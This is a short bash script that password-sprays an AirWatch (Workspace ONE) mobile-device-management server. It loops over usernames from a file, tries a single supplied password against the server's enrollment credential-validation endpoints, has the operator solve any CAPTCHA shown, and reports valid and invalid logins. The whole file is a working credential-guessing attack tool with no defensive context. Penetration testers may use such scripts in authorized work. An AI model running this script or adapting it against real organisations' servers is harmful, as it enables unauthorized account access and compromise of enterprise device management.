#!/bin/bash
while read -u 3 usern
do
    export DOMAIN=$1
    export URL=$2
    export PASSWORD=$3
    export RANDHEX=$(hexdump -n 16 -e '4/4 "%08X" 1 "\n"' /dev/random | tr '[:upper:]' '[:lower:]')
    cat request1.txt  | sed "s/DOMAIN/$DOMAIN/" | sed "s/RANDHEX/$RANDHEX/"| sed "s/RANDHEX/$RANDHEX/" > request1.dat
    export REQUEST=$(curl -s --data @request1.dat https://$URL/deviceservices/enrollment/airwatchenroll.aws/validategroupidentifier > request1result.dat)
    export SESSID=$(cat request1result.dat | jq .Header | jq .SessionId|tr -d \")
    export USERNAME=$usern
    export PASSWORD=$PASSWORD
    cat request2.txt | sed "s/USERNAME/$USERNAME/" | sed "s/PASSWORD/$PASSWORD/" |sed "s/SESSID/$SESSID/" |sed "s/RANDHEX/$RANDHEX/" |sed "s/RANDHEX/$RANDHEX/" > request2.dat
    export REQUEST=$(curl -s --data @request2.dat https://$URL/deviceservices/enrollment/airwatchenroll.aws/validatelogincredentials > request2result.dat)
    export RESULT=$(cat request2result.dat | jq .Status | jq .Code)
    export CAPTCHA=$(cat request2result.dat | jq .NextStep | jq .IsCaptchaRequired)
    export CAPTCHAIMG=$(cat request2result.dat | jq .NextStep | jq .CaptchaValue | tr -d \")
    if [ "$CAPTCHA" == "true" ]
    then
        echo $CAPTCHAIMG | base64 -d > captcha.jpg
        open -n captcha.jpg
        read -p "Please solve the CAPTCHA presented: " userInput
        cat request2.dat | sed "s/CaptchaValue\":\"/CaptchaValue\":\"$userInput/" > request2captcha.dat
        export REQUEST=$(curl -s --data @request2captcha.dat https://$URL/deviceservices/enrollment/airwatchenroll.aws/validatelogincredentials > request2result.dat)
        export RESULT=$(cat request2result.dat | jq .Status | jq .Code)
        if  [ $RESULT -eq 1 ]
        then
            echo "Valid Login: $USERNAME $PASSWORD"
        else
            echo "Invalid Login: $USERNAME $PASSWORD"
        fi
    else
        if  [ $RESULT -eq 1 ]
        then
            echo "Valid Login: $USERNAME $PASSWORD"
        else
            echo "Invalid Login: $USERNAME $PASSWORD"
        fi
    fi
done 3< users.txt
#cleanup
rm captcha.jpg *.dat 